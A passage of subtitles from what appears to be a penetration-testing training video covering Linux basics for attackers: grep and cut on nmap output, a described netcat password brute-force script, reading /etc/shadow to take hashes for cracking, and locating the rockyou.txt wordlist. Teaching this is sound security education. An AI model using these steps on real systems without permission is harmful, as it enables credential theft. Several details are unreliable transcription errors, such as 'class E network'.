--> 00:27:50.810\nYou want to go okay, I'm gonna start with\nscanning this, building that, looking\n\n601\n00:27:50.810 --> 00:27:56.000\nup hosts, doing that, and then you keep a\nfile structure that is in line with that.\n\n602\n00:27:56.000 --> 00:28:01.720\nIf I wanna Nmap scan, I keep my file\ncalled this hosts name slash end map.\n\n603\n00:28:01.720 --> 00:28:04.610\nRight?\nI know that's the nmap scan for that host.\n\n604\n00:28:04.610 --> 00:28:06.660\nAnd I can just open it and\nI can go back to it anytime I want.\n\n605\n00:28:07.820 --> 00:28:08.960\nWait, cuz let me tell you\n&gt;&gt; [LAUGH]\n\n606\n00:28:08.960 --> 00:28:10.030\n&gt;&gt; Some of those nmap scans\n\n607\n00:28:10.030 --> 00:28:12.240\ncan get a little long in the tooth.\n\n608\n00:28:12.240 --> 00:28:15.055\nYou're like, man I shouldn't have\ndone UDP, that was a mistake.\n\n609\n00:28:15.055 --> 00:28:16.460\n&gt;&gt; [LAUGH]\n&gt;&gt; That was a mistake.\n\n610\n00:28:16.460 --> 00:28:17.600\nExcept it found that open port.\n\n611\n00:28:17.600 --> 00:28:18.512\nNow I got into the box, so.\n\n612\n00:28:18.512 --> 00:28:19.020\n[LAUGH]\n&gt;&gt; [LAUGH] Yeah.\n\n613\n00:28:19.020 --> 00:28:23.656\nOr when you're working on a network and\nthere's 50, 100, 250 live hosts.\n\n614\n00:28:23.656 --> 00:28:25.812\nAnd you're trying to do\nport scans on all those.\n\n615\n00:28:25.812 --> 00:28:29.696\nKeeping that stuff organized and\nstraight, very important part.\n\n616\n00:28:29.696 --> 00:28:30.740\n&gt;&gt; Yeah.\n\n617\n00:28:30.740 --> 00:28:32.880\nAnother thing you wanna do,\nreally quickly, is grep.\n\n618\n00:28:32.880 --> 00:28:36.230\nYou definitely wanna get\ncomfortable with grep.\n\n619\n00:28:36.230 --> 00:28:39.294\nIf you're not comfortable with grep,\ndefinitely run to our Linux shows.\n\n620\n00:28:39.294 --> 00:28:41.530\n[LAUGH] Find that in there.\n\n621\n00:28:41.530 --> 00:28:44.170\nI'm trying to think\nwhat it would be under.\n\n622\n00:28:44.170 --> 00:28:45.470\nI'll think of it later.\n\n623\n00:28:45.470 --> 00:28:47.340\nAnd learn how to use grep.\n\n624\n00:28:47.340 --> 00:28:50.320\nYou can always jump to the man page,\nbelieve it or not, and\n\n625\n00:28:50.320 --> 00:28:53.630\nlearn just about everything you'd ever\nwanna know about how to use grep.\n\n626\n00:28:53.630 --> 00:28:55.040\nIt's a fantastic tool, and\n\n627\n00:28:55.040 --> 00:28:58.080\nbasically it just pulls out information\nthat you tell it to look for.\n\n628\n00:28:58.080 --> 00:29:03.091\nSo if I've got a file full of IP\naddresses and I'm looking for one,\n\n629\n00:29:03.091 --> 00:29:09.373\nwhat was the one that had, that had the\nvulnerability or port 3, 2, 3 was open.\n\n630\n00:29:09.373 --> 00:29:14.120\nThat's the one I'm looking for while I can\ngrep port 3, 2, 3 and it will find that.\n\n631\n00:29:14.120 --> 00:29:17.230\nSo, we'll take our little\nsuperfile1 here as an example.\n\n632\n00:29:17.230 --> 00:29:19.560\nWe'll put some content in there,\nhow about that?\n\n633\n00:29:19.560 --> 00:29:24.333\nNano and nano's one of my favorite text\neditors because it's a little more\n\n634\n00:29:24.333 --> 00:29:27.147\nsimple than vi, learn vi, learn to use vi.\n\n635\n00:29:27.147 --> 00:29:29.850\nBut I like nano for ease of use.\n\n636\n00:29:29.850 --> 00:29:33.260\nAnd we'll say, superfile1 here,\nI'm just gonna add some content.\n\n637\n00:29:33.260 --> 00:29:39.437\nSo this is another string of text,\n\n638\n00:29:39.437 --> 00:29:46.042\nyet another, and still more again.\n\n639\n00:29:46.042 --> 00:29:47.666\nAll right, so just simple text, right?\n\n640\n00:29:47.666 --> 00:29:51.500\nSave that if I can.\n\n641\n00:29:51.500 --> 00:29:52.070\nX.\n\n642\n00:29:52.070 --> 00:29:53.270\nAnd now I can use grep.\n\n643\n00:29:53.270 --> 00:29:54.370\nI say which line.\n\n644\n00:29:54.370 --> 00:29:56.340\nWe'll pretend this was\na multi thousand line thing.\n\n645\n00:29:56.340 --> 00:29:57.810\nI'll say man which one.\n\n646\n00:29:57.810 --> 00:29:59.350\nIt said yet something.\n\n647\n00:29:59.350 --> 00:30:00.290\nI can't remember what it was.\n\n648\n00:30:00.290 --> 00:30:04.450\nSo I can cat superfile and then pipe that.\n\n649\n00:30:04.450 --> 00:30:05.650\nYou use your pipe operander.\n\n650\n00:30:05.650 --> 00:30:08.340\nIt's the one right above\nyour Return key usually,\n\n651\n00:30:08.340 --> 00:30:11.510\nit's got the backslash on it sometimes,\nor all the time I think.\n\n652\n00:30:11.510 --> 00:30:16.120\nAnd then you just type grep and\nthen whatever you're looking for.\n\n653\n00:30:16.120 --> 00:30:18.100\nSo I'm looking for the term yet.\n\n654\n00:30:18.100 --> 00:30:20.110\nLook, there it is, it shows me that line.\n\n655\n00:30:20.110 --> 00:30:22.970\nWhatever's on that line,\nit'll show me everything.\n\n656\n00:30:22.970 --> 00:30:27.650\nThen you can use things like cut or\nsaid, or together to cut out those.\n\n657\n00:30:27.650 --> 00:30:29.550\nAgain, man that stuff, right, man cut.\n\n658\n00:30:29.550 --> 00:30:33.350\nIt removes sections\nfrom each line of file.\n\n659\n00:30:33.350 --> 00:30:34.620\nSo if I wanna take stuff out,\n\n660\n00:30:34.620 --> 00:30:39.130\nthis is gonna help you out a lot when you\ndo have these long, drawn out systems.\n\n661\n00:30:39.130 --> 00:30:40.410\nMy goodness, so much information,\n\n662\n00:30:40.410 --> 00:30:44.260\nand you want to just get\ncertain information out of it.\n\n663\n00:30:44.260 --> 00:30:49.850\nYou use grep to pipe that into sed,\npipe that into cut, and start removing\n\n664\n00:30:49.850 --> 00:30:54.470\ninformation so that you only are left\nwith exactly what you're looking for.\n\n665\n00:30:54.470 --> 00:30:57.550\nCuz there's usually a lot of extraneous\ninformation with these outputs.\n\n666\n00:30:57.550 --> 00:31:02.644\nSo that can definitely be your sed\nis another one, obviously man sed.\n\n667\n00:31:02.644 --> 00:31:05.710\nIt's the stream editor for\nfiltering and transforming text.\n\n668\n00:31:05.710 --> 00:31:08.830\nVery cool,\nvery powerful piece of software.\n\n669\n00:31:08.830 --> 00:31:10.840\nThey've written whole books on this thing.\n\n670\n00:31:10.840 --> 00:31:13.770\nBut definitely learn to\nuse the basics on that.\n\n671\n00:31:13.770 --> 00:31:16.240\n&gt;&gt; Yeah,\nunbelievably how powerful those tools are.\n\n672\n00:31:16.240 --> 00:31:18.590\nAnd you think they're just simple\nlittle command line tools.\n\n673\n00:31:18.590 --> 00:31:22.280\nBut you take an nmap result for example,\nlet's say you scan a class E network.\n\n674\n00:31:22.280 --> 00:31:25.310\nYou get 254 possible hosts.\n\n675\n00:31:25.310 --> 00:31:27.860\nWell when you look at that output,\nyou save it to a file.\n\n676\n00:31:27.860 --> 00:31:31.720\nThe first few lines are like repeating\nyour command, nmap, the version number.\n\n677\n00:31:31.720 --> 00:31:33.535\nNone of that's necessary for\nwhat I wanna do.\n\n678\n00:31:33.535 --> 00:31:36.870\nI wanna do a deeper scan but\nonly on a live host.\n\n679\n00:31:36.870 --> 00:31:39.410\nSo all I need is the IP addresses.\n\n680\n00:31:39.410 --> 00:31:42.644\nBy using a combination of grep and\nlooking for the word up, for example,\n\n681\n00:31:42.644 --> 00:31:44.932\nI can eliminate all the other\nlines in that output.\n\n682\n00:31:44.932 --> 00:31:48.838\nAnd then I start using cut to take that\nsecond column where it's just the IP\n\n683\n00:31:48.838 --> 00:31:50.666\naddress, and before you know it,\n\n684\n00:31:50.666 --> 00:31:54.007\nI end up with a file that's just\nIP address one after the other,\n\n685\n00:31:54.007 --> 00:31:57.754\none on each line That I can turn around\nand feed into any other command.\n\n686\n00:31:57.754 --> 00:32:02.750\nIt's extremely time saving, I guess.\n\n687\n00:32:02.750 --> 00:32:06.290\nIf you learn these tools, learn how to\nuse them, it can be very beneficial, and\n\n688\n00:32:06.290 --> 00:32:08.740\nmake your penetration\ntesting more efficient.\n\n689\n00:32:08.740 --> 00:32:10.240\n&gt;&gt; That's exactly right.\n\n690\n00:32:10.240 --> 00:32:12.540\nAll right, that being said,\nI know we're running short on time, so\n\n691\n00:32:12.540 --> 00:32:15.560\nwe wanna kinda get through\nsome more foundational stuff.\n\n692\n00:32:15.560 --> 00:32:16.760\nLet us talk about scripting.\n\n693\n00:32:16.760 --> 00:32:19.430\nYou definitely need to know\nhow to do bash scripting.\n\n694\n00:32:19.430 --> 00:32:23.250\nIf you do not know how to do\nbash scripting well guess what\n\n695\n00:32:23.250 --> 00:32:24.080\nwelcome to ITPROTV.\n\n696\n00:32:24.080 --> 00:32:27.595\nWhere we actually have a course and\nI am not gonna lie it's good.\n\n697\n00:32:27.595 --> 00:32:29.400\n&gt;&gt; [LAUGH]\n&gt;&gt; It is fantastic.\n\n698\n00:32:29.400 --> 00:32:31.060\nIf I do say so myself\n&gt;&gt; Who was that?\n\n699\n00:32:31.060 --> 00:32:34.090\n&gt;&gt; I do not know who was that who\nasked me on that right it was me.\n\n700\n00:32:34.090 --> 00:32:37.940\nI am kidding around I hopefully you\nguys will like it I try to do a good job\n\n701\n00:32:37.940 --> 00:32:40.000\nI'm presenting that information.\n\n702\n00:32:40.000 --> 00:32:42.900\nAnd if you don't know scripting,\nspecifically bash scripting,\n\n703\n00:32:42.900 --> 00:32:44.880\nthat's what we're talking about,\ngo check that show out.\n\n704\n00:32:44.880 --> 00:32:46.510\nIt's not that long.\n\n705\n00:32:46.510 --> 00:32:47.730\nIt's not even that complex.\n\n706\n00:32:47.730 --> 00:32:50.250\nI tried to make it simple and practical so\n\n707\n00:32:50.250 --> 00:32:53.300\nthat you can get that stuff\nunderneath your belt.\n\n708\n00:32:53.300 --> 00:32:54.360\nLet's do take a look at my computer.\n\n709\n00:32:54.360 --> 00:32:56.800\nI'm gonna show you some of the things\nyou can do with bash scripting.\n\n710\n00:32:56.800 --> 00:33:01.130\nThis is a script that I wrote when\nI was learning some bash scripting.\n\n711\n00:33:02.370 --> 00:33:06.080\nSo this is actually a brute force for\nour password.\n\n712\n00:33:06.080 --> 00:33:08.230\nYeah, and you're like,\na brute force for a password?\n\n713\n00:33:08.230 --> 00:33:12.470\nYep, basically what I'm doing here is I'm\nechoing, now this is very rudimentary,\n\n714\n00:33:12.470 --> 00:33:14.615\nthis is very, this is bad code,\nto be honest with you.\n\n715\n00:33:14.615 --> 00:33:17.150\n&gt;&gt; [LAUGH]\n&gt;&gt; I could do this a whole lot better now,\n\n716\n00:33:17.150 --> 00:33:21.790\nbut it shows you the power of\neven learning some simple basics\n\n717\n00:33:21.790 --> 00:33:24.410\nof bash scripting of what\nyou can do with that.\n\n718\n00:33:24.410 --> 00:33:28.170\nAnd what I've done is basically I'm doing\nit if loop so you need to know loops,\n\n719\n00:33:28.170 --> 00:33:30.870\nall right no I'm sorry if it's not\nloop if is a conditional statement.\n\n720\n00:33:30.870 --> 00:33:36.490\nSo if this then that kinda thing so\nthat your scripts can make decisions,\n\n721\n00:33:36.490 --> 00:33:41.490\nand then there's loops you gotta learn\nloops on do this until this is done\n\n722\n00:33:41.490 --> 00:33:44.960\nkinda thing or wow this is true do this.\n\n723\n00:33:44.960 --> 00:33:46.430\nThat's the idea you're looking for.\n\n724\n00:33:46.430 --> 00:33:47.950\nYou'll understand what variables are.\n\n725\n00:33:47.950 --> 00:33:50.320\nBasically containers for information.\n\n726\n00:33:50.320 --> 00:33:52.880\nSo you feed a variable some information.\n\n727\n00:33:52.880 --> 00:33:55.450\nAnd then it uses the variable\n\n728\n00:33:55.450 --> 00:33:58.060\nas that information throughout\nthe rest of your script.\n\n729\n00:33:58.060 --> 00:34:00.250\nYou can modify it, change it,\ndo certain things with it.\n\n730\n00:34:00.250 --> 00:34:01.530\nVery cool stuff.\n\n731\n00:34:01.530 --> 00:34:05.580\nDefinitely, if you don't know anything\nabout scripting, you'll want to go and\n\n732\n00:34:05.580 --> 00:34:07.000\nwatch that show, to be honest with you.\n\n733\n00:34:07.000 --> 00:34:09.090\nIt's going to be a big help.\n\n734\n00:34:09.090 --> 00:34:13.200\nI have to assume that this point\nthat you can do this cuz otherwise\n\n735\n00:34:13.200 --> 00:34:14.540\nwe're gonna do a bash scripting show.\n\n736\n00:34:14.540 --> 00:34:16.150\nAnd we'll never get out of here.\n\n737\n00:34:16.150 --> 00:34:19.880\nBut I can use this as an example so\nthat you can see some of those things.\n\n738\n00:34:19.880 --> 00:34:21.450\nSo let's take a look really quickly.\n\n739\n00:34:21.450 --> 00:34:26.970\nI have a while loop, so\nwhile I does not equal 10,000.\n\n740\n00:34:26.970 --> 00:34:28.310\nDo this if statement.\n\n741\n00:34:28.310 --> 00:34:34.750\nSo if i is less than 10 then echo this\nstring which was part of the password.\n\n742\n00:34:34.750 --> 00:34:38.800\nAnd basically it was a salted\npassword with a 4 digit number.\n\n743\n00:34:38.800 --> 00:34:42.470\nSo you had a password and then you\nhad to come up with a 4 digit number\n\n744\n00:34:42.470 --> 00:34:45.160\nadded to that, but\nI know what that four digit number was.\n\n745\n00:34:45.160 --> 00:34:49.660\nSo I had to have the computer\nfigure out what it was for me.\n\n746\n00:34:51.260 --> 00:34:53.550\nSo it adds a, which a equal 0000.\n\n747\n00:34:53.550 --> 00:35:01.560\nA little caveat to the script\nwas number zero was 0000.\n\n748\n00:35:01.560 --> 00:35:03.120\nThe next number was 0001.\n\n749\n00:35:03.120 --> 00:35:06.730\nRemember, it had to be four digits\neven if the other digits were 0.\n\n750\n00:35:06.730 --> 00:35:07.810\nI couldn't just go 2345.\n\n751\n00:35:07.810 --> 00:35:10.970\nSo I had to finagle that around.\n\n752\n00:35:10.970 --> 00:35:14.700\nAnd then I used netcat to make\nthe actual connection to the host.\n\n753\n00:35:14.700 --> 00:35:18.610\nSo it would pump that information into\nnetcat basically trying to log in.\n\n754\n00:35:18.610 --> 00:35:20.570\nAnd then let me know whether or\nnot I was successful.\n\n755\n00:35:20.570 --> 00:35:22.160\nIf it wasn't, it incremented.\n\n756\n00:35:22.160 --> 00:35:26.660\nThis is that ++ idea that\nC style incrementation.\n\n757\n00:35:27.750 --> 00:35:29.210\nAnd then it would go to the next.\n\n758\n00:35:29.210 --> 00:35:30.980\nSo if it went, 0001, it didn't work.\n\n759\n00:35:30.980 --> 00:35:31.730\nOkay, 0002, it didn't work.\n\n760\n00:35:31.730 --> 00:35:33.170\nAnd so on and so forth.\n\n761\n00:35:33.170 --> 00:35:35.820\nOf course we're gonna talk\nmore about brute forcing.\n\n762\n00:35:35.820 --> 00:35:40.130\nBut I did that with basic, this is very,\nvery basic bash scripting.\n\n763\n00:35:40.130 --> 00:35:43.809\nAnd I was able successfully took two\nhours for it to run and complete, but\n\n764\n00:35:43.809 --> 00:35:46.180\nbasic skills will get you there.\n\n765\n00:35:46.180 --> 00:35:47.330\nLet's see here.\n\n766\n00:35:47.330 --> 00:35:48.330\nSoftware installation.\n\n767\n00:35:48.330 --> 00:35:49.160\nGot to know how to do that.\n\n768\n00:35:49.160 --> 00:35:51.150\nLet me pump back over to my computer here.\n\n769\n00:35:51.150 --> 00:35:53.600\nIf you want to install\nsomething use the apt.\n\n770\n00:35:53.600 --> 00:35:55.420\nIf you're gonna Ubuntu system use apt-get.\n\n771\n00:35:55.420 --> 00:35:57.820\nIf you're running some\nsort of Red Hat variance.\n\n772\n00:35:57.820 --> 00:35:59.840\nI say Ubuntu, it's really deviant.\n\n773\n00:35:59.840 --> 00:36:03.512\nAny deviant system that uses\nkind of the .dev stuff.\n\n774\n00:36:03.512 --> 00:36:07.110\nYou wanna be able to use\nthe apt-get system in there.\n\n775\n00:36:07.110 --> 00:36:12.580\nIf it's a Red Hat, Fedora variant then\nyou're gonna use the yum installation.\n\n776\n00:36:12.580 --> 00:36:14.720\nSo you gotta be familiar with those.\n\n777\n00:36:14.720 --> 00:36:20.730\nAnd really simple, so it's just\nbasically apt-get install package name.\n\n778\n00:36:20.730 --> 00:36:24.240\nSo if I wanted MariaDB or\nwhatever the case is.\n\n779\n00:36:24.240 --> 00:36:25.250\nI would pipe that in there.\n\n780\n00:36:25.250 --> 00:36:26.550\nI can't think of anything\noff the top of my head to\n\n781\n00:36:26.550 --> 00:36:27.685\ninstall that I don't already have.\n\n782\n00:36:27.685 --> 00:36:29.310\n[LAUGH] Cuz I'm running Golly Linux.\n\n783\n00:36:29.310 --> 00:36:30.630\nIt's an amazing piece of software.\n\n784\n00:36:30.630 --> 00:36:33.690\nIt really is people,\nI don't know what to tell you.\n\n785\n00:36:33.690 --> 00:36:36.900\nAnd then Yum would be\nsimilar to Yum install.\n\n786\n00:36:36.900 --> 00:36:40.790\nWhatever, if you're not logged in as root\nas I am by the way, that's a bad idea.\n\n787\n00:36:40.790 --> 00:36:44.100\nI know right, but it's a test box so\nI don't really care.\n\n788\n00:36:44.100 --> 00:36:47.895\nYou would have to do sudu like so.\n\n789\n00:36:47.895 --> 00:36:49.970\nSo don't forget that.\n\n790\n00:36:49.970 --> 00:36:51.310\nLet's see what else do we need to know?\n\n791\n00:36:51.310 --> 00:36:51.928\nNetworking!\n\n792\n00:36:51.928 --> 00:36:52.490\nAll right.\n\n793\n00:36:52.490 --> 00:36:57.397\nNetworking is a lot of fun, gotta\nunderstand how to make sure get your i-p\n\n794\n00:36:57.397 --> 00:37:02.390\naddress, how do I get into my\nd-h-c-p address if I need to?\n\n795\n00:37:02.390 --> 00:37:04.130\nYou gotta know these things.\n\n796\n00:37:04.130 --> 00:37:07.350\nSo, let's go back to the machine here.\n\n797\n00:37:07.350 --> 00:37:09.610\nLet's clear it out maybe.\n\n798\n00:37:09.610 --> 00:37:13.600\nSo, run ifconfig,\nlike that lot of networking information.\n\n799\n00:37:13.600 --> 00:37:16.540\nAlso an ip addr like so.\n\n800\n00:37:16.540 --> 00:37:19.310\nAlso it's kind of the new\nwave of ifconfig.\n\n801\n00:37:20.750 --> 00:37:22.760\nGet familiar with both of\nthose to be honest with you.\n\n802\n00:37:22.760 --> 00:37:26.250\nAt this point I have config\nnot completely doodled yet.\n\n803\n00:37:26.250 --> 00:37:27.460\nSo learn both.\n\n804\n00:37:29.130 --> 00:37:31.550\nLearn how to SSH into something.\n\n805\n00:37:31.550 --> 00:37:36.430\nSo if I wanted to SSH into an SSH\nserver secure shell, definitely\n\n806\n00:37:36.430 --> 00:37:39.590\nsomething you're gonna need to know for\nthis series to be honest with you.\n\n807\n00:37:39.590 --> 00:37:43.940\nSSH, and then I can do this box thing,\nget this running, SSH, [INAUDIBLE] one.\n\n808\n00:37:46.440 --> 00:37:47.930\nAnd it's asking for our password.\n\n809\n00:37:49.620 --> 00:37:51.835\nThat's not my password,\nI'm typing the wrong one.\n\n810\n00:37:51.835 --> 00:37:53.650\n&gt;&gt; [LAUGH]\n&gt;&gt; Fun, I can't type.\n\n811\n00:37:53.650 --> 00:37:55.480\nBut anyway, you get the idea,\nthere you go.\n\n812\n00:37:55.480 --> 00:37:57.160\nType in your password, you log in.\n\n813\n00:37:57.160 --> 00:37:59.220\nYou get a shell prompt just like\nwhat you're looking at here.\n\n814\n00:37:59.220 --> 00:38:01.960\nYou're gonna be doing some SSHing,\nwe're gonna be doing things like that.\n\n815\n00:38:01.960 --> 00:38:04.180\nTelnet is the same kind of idea.\n\n816\n00:38:04.180 --> 00:38:08.298\nI have config basics on DH client is for\n\n817\n00:38:08.298 --> 00:38:15.750\nget the DHCP, basically that release and\nrenew kinda thing.\n\n818\n00:38:15.750 --> 00:38:21.400\nYou do a -r to kinda release it and\ntell it what it is.\n\n819\n00:38:21.400 --> 00:38:23.770\nSo this is eth 1.\n\n820\n00:38:23.770 --> 00:38:27.520\nThat would be,\nI think that's what it is over here.\n\n821\n00:38:27.520 --> 00:38:31.560\nYeah, so we have eth1 and eth0 on\nthis one, and there's my IP address.\n\n822\n00:38:31.560 --> 00:38:34.300\nSo if I wanted to release that,\nI would say, eth1.\n\n823\n00:38:34.300 --> 00:38:37.600\nLet it know that's\nthe device I wanna release.\n\n824\n00:38:37.600 --> 00:38:40.010\nAnd then if I wanna get it\nback I just do the same thing,\n\n825\n00:38:40.010 --> 00:38:43.070\nexcept for -r, just do a -v so\nyou can see what's happening.\n\n826\n00:38:43.070 --> 00:38:46.000\nMake sure that door\nprocess gets completed.\n\n827\n00:38:46.000 --> 00:38:46.630\nWhere are we?\n\n828\n00:38:46.630 --> 00:38:47.740\nYeah.\nNow we're coming back to our\n\n829\n00:38:47.740 --> 00:38:49.210\nlittle teaser.\n\n830\n00:38:49.210 --> 00:38:49.800\nAlmost done Mike.\n\n831\n00:38:49.800 --> 00:38:51.190\nI know we're going overtime.\n\n832\n00:38:51.190 --> 00:38:52.080\nAlmost done.\n\n833\n00:38:52.080 --> 00:38:54.800\nI don't mind and I know our\nviewers don't mind at this point.\n\n834\n00:38:54.800 --> 00:38:55.417\n&gt;&gt; Yeah, good stuff.\n\n835\n00:38:55.417 --> 00:38:57.330\n&gt;&gt; They're hating our life right now.\n\n836\n00:38:57.330 --> 00:38:59.250\nYou gotta know where\nthe passwords are in this thing.\n\n837\n00:38:59.250 --> 00:39:03.340\nBecause as a hacker,\nI kinda want that information, right?\n\n838\n00:39:03.340 --> 00:39:07.710\nThat's something you may be interested in\nthat if you're any kind of pen tester or\n\n839\n00:39:07.710 --> 00:39:08.770\nhacker minded.\n\n840\n00:39:08.770 --> 00:39:09.940\nSo where are those stored?\n\n841\n00:39:09.940 --> 00:39:11.370\nLet me clear this out yet again.\n\n842\n00:39:13.830 --> 00:39:17.490\nIf you cd to /etc you can cat or\n\n843\n00:39:17.490 --> 00:39:23.350\njust do cats/etc/,\nfirst one is password, like so.\n\n844\n00:39:23.350 --> 00:39:27.715\nThis will show you all the users that are\non the system, among many groups as well,\n\n845\n00:39:27.715 --> 00:39:33.930\nbut cuz most users have a group so\nyou get all in one package.\n\n846\n00:39:33.930 --> 00:39:35.980\nYou'll notice that I've got\na couple of users for FTP,\n\n847\n00:39:35.980 --> 00:39:40.060\nI was playing around with my FTP box so\nI put those in here.\n\n848\n00:39:41.440 --> 00:39:44.060\nIf I wanna integrate users,\nI wanna know whose on this system.\n\n849\n00:39:44.060 --> 00:39:46.740\nWell there you go,\nI need that FT password.\n\n850\n00:39:46.740 --> 00:39:50.560\nBack in the day, this is where\nthe password was actually stored.\n\n851\n00:39:50.560 --> 00:39:51.680\nThey put the password in here.\n\n852\n00:39:51.680 --> 00:39:55.419\nI wanna say it was at one\ntime even plain text.\n\n853\n00:39:55.419 --> 00:39:55.977\n&gt;&gt; Wow.\n\n854\n00:39:55.977 --> 00:39:59.169\n&gt;&gt; So but only root had access or\npeople with the right privileges.\n\n855\n00:39:59.169 --> 00:40:02.233\nActually probably back then,\nback in the day day, maybe well,\n\n856\n00:40:02.233 --> 00:40:06.206\nnobody knows what that file is anyways,\nso we'll just put the passwords in there,\n\n857\n00:40:06.206 --> 00:40:07.769\nthat's probably the mind set.\n\n858\n00:40:07.769 --> 00:40:09.710\nAnd then someone grabbed passwords and\nsaid,\n\n859\n00:40:09.710 --> 00:40:12.907\nmaybe we should do something about that,\nand they added a little security.\n\n860\n00:40:12.907 --> 00:40:17.277\nSo they did that, and now there's a,\nI think the md5 hashed values,\n\n861\n00:40:17.277 --> 00:40:21.294\nI'm pretty sure that's what they are now,\nI'm not 100%.\n\n862\n00:40:21.294 --> 00:40:25.060\nIt'll tell you in your\ndistribution what they're using.\n\n863\n00:40:25.060 --> 00:40:26.810\nBut then you need to know\nabout the SE shadow file,\n\n864\n00:40:26.810 --> 00:40:30.180\nwhich is where the passwords\nare actually stored.\n\n865\n00:40:30.180 --> 00:40:34.920\nAnd only roots,\nonly if thou art the great one\n\n866\n00:40:34.920 --> 00:40:37.910\nof the machine will you\nget access to that.\n\n867\n00:40:37.910 --> 00:40:39.268\nSo let's take a look at\nwhat that looks like.\n\n868\n00:40:39.268 --> 00:40:45.570\ncat shadow, and there you go,\nso this right here,\n\n869\n00:40:46.910 --> 00:40:53.390\nthis, all this mess, is the actual\npassword for this machine, bing.\n\n870\n00:40:53.390 --> 00:40:58.540\nIt's a lot of stuff, right,\na lot of information going on in there.\n\n871\n00:40:58.540 --> 00:40:59.430\nThese are the files.\n\n872\n00:40:59.430 --> 00:41:03.190\nThis file, specifically, is what\nyou'll need to do password cracking.\n\n873\n00:41:03.190 --> 00:41:06.660\nSo, I need to snatch the contents of\nthis file, so I can run that through\n\n874\n00:41:06.660 --> 00:41:10.530\nmy password cracker and find out what this\nguy's password is, so that I can break in.\n\n875\n00:41:10.530 --> 00:41:12.000\nWe will be doing password cracking,\n\n876\n00:41:12.000 --> 00:41:14.560\nnot just talking about password,\nwe will do password cracking.\n\n877\n00:41:14.560 --> 00:41:16.922\nIt will crack passwords, it will be fun.\n\n878\n00:41:16.922 --> 00:41:20.980\nAll right, find and locate,\nso you can find things,\n\n879\n00:41:20.980 --> 00:41:23.510\nyou need to find a file from time to time.\n\n880\n00:41:23.510 --> 00:41:26.630\nSomething like the big word list for\n\n881\n00:41:26.630 --> 00:41:28.560\na dictionary attack on a password,\nit's a good one.\n\n882\n00:41:28.560 --> 00:41:31.575\nSo I'll find one of the find,\nyou use find command.\n\n883\n00:41:31.575 --> 00:41:37.110\nSlash, or if I wanna name a specific\ndirectory that I wanna look in,\n\n884\n00:41:37.110 --> 00:41:38.880\nthis, I'm just gonna go with the root.\n\n885\n00:41:38.880 --> 00:41:42.530\nLook everywhere, look and\nstart at the top and go all the way down.\n\n886\n00:41:42.530 --> 00:41:46.128\nTell it / -name,\nwhat is the name of the file?\n\n887\n00:41:46.128 --> 00:41:51.950\nIt is rockyou.txt,\nit's a good file to get familiar with.\n\n888\n00:41:51.950 --> 00:41:54.190\nAnd then I like to tag this on the end, so\n\n889\n00:41:54.190 --> 00:41:57.580\nI don't get a bunch of errors,\nespecially if I'm not logged in as root.\n\n890\n00:41:57.580 --> 00:42:00.481\nIf you do 2/dev/null like that,\n\n891\n00:42:00.481 --> 00:42:05.010\nthat 2 lets it know that\nthat's the error messages.\n\n892\n00:42:05.010 --> 00:42:10.290\nAny error messages, send that to\n/dev/null, which is basically nowhere.\n\n893\n00:42:10.290 --> 00:42:12.210\nIt's a nothing bucket.\n\n894\n00:42:12.210 --> 00:42:14.110\nJust put those there, so\nI don't wanna see it.\n\n895\n00:42:14.110 --> 00:42:19.410\nSo instead of pumping them out to the\nstandard output, run that out to dev/null,\n\n896\n00:42:19.410 --> 00:42:21.110\nI don't wanna see it.\n\n897\n00:42:21.110 --> 00:42:22.035\nCuz they can get extensive.\n\n898\n00:42:22.035 --> 00:42:23.270\n&gt;&gt; [LAUGH]\n&gt;&gt; And you go and look,\n\n899\n00:42:23.270 --> 00:42:27.440\nthey're found, rockyou is in\n/root/attack!/Password_Stuff/rockyou.txt.\n\n900\n00:42:27.440 --> 00:42:31.020\nIt's also in\nusr/share/wordlists/rockyou.txt.\n\n901\n00:42:31.020 --> 00:42:37.372\nSo you can also use locate,\nokay, to rockyou.txt, like that.\n\n902\n00:42:37.372 --> 00:42:41.260\nAnd you'll see it found all those as well.\n\n903\n00:42:41.260 --> 00:42:43.489\nI think it actually found one more,\nthere it is.\n\n904\n00:42:43.489 --> 00:42:48.959\nBecause it had .tar, .gz, so\nit did a little better job, locate.\n\n905\n00:42:48.959 --> 00:42:53.150\nYou'll probably use both from time to\ntime, so get familiar with both of those.\n\n906\n00:42:53.150 --> 00:42:56.330\nSearching and finding, all right,\nwhat about Windows, what about Mac?\n\n907\n00:42:57.750 --> 00:42:59.080\nThey all have their own tools.\n\n908\n00:42:59.080 --> 00:43:04.995\nA lot of the best tools running out\naround out there are ported to Windows.\n\n909\n00:43:04.995 --> 00:43:07.415\nThey are ported to Macs, many of them are.\n\n910\n00:43:07.415 --> 00:43:10.178\nSo they're not out in the weeds\ncompletely, things like nmap are there.\n\n911\n00:43:10.178 --> 00:43:14.885\nThere's a great all-in-one tool\ncalled CanEnable, fantastic tool.\n\n912\n00:43:14.885 --> 00:43:16.285\nPlay with that, it's fun.\n\n913\n00:43:18.255 --> 00:43:22.760\nBut typically not what we're gonna do for\nour platform for hacking.\n\n914\n00:43:22.760 --> 00:43:26.840\nYou can do some, but\neverything isn't quite there.\n\n915\n00:43:26.840 --> 00:43:29.792\nYou will need it for testing,\nwe'll need to build sandboxes, right?\n\n916\n00:43:29.792 --> 00:43:32.010\nI'm gonna be attacking Windows\nmachine from time to time.\n\n917\n00:43:32.010 --> 00:43:34.712\nI don't know about you, I don't go,\nwell, it’s a Windows machine,\n\n918\n00:43:34.712 --> 00:43:36.028\nI guess I'm gonna leave it alone.\n\n919\n00:43:36.028 --> 00:43:38.880\nNo, I want to get into\nthose boxes as well.\n\n920\n00:43:38.880 --> 00:43:42.260\nSo it's good to have one laying around for\ntesting purposes,\n\n921\n00:43:42.260 --> 00:43:45.913\nattack platform purposes,\njust depending on what you wanna run.\n\n922\n00:43:45.913 --> 00:43:47.360\nWe also wanna talk about that.\n\n923\n00:43:50.514 --> 00:43:53.465\nYeah, everything's good,\nit's a necessary platform,\n\n924\n00:43:53.465 --> 00:43:56.947\ntypically, in my environment as\na Pintester, I'm gonna have a Mac,\n\n925\n00:43:56.947 --> 00:43:59.912\nI'm gonna have a Linux, and\nI'm gonna have a Windows box.\n\n926\n00:43:59.912 --> 00:44:02.356\nJust so that I can work interoperably,\n\n927\n00:44:02.356 --> 00:44:05.700\nregardless of what system\nmay come down my pipe here.\n\n928\n00:44:05.700 --> 00:44:07.140\nAnd the same thing goes with Mac, right?\n\n929\n00:44:07.140 --> 00:44:10.949\nJust take all that stuff I said about\nWindows and throw it on top of 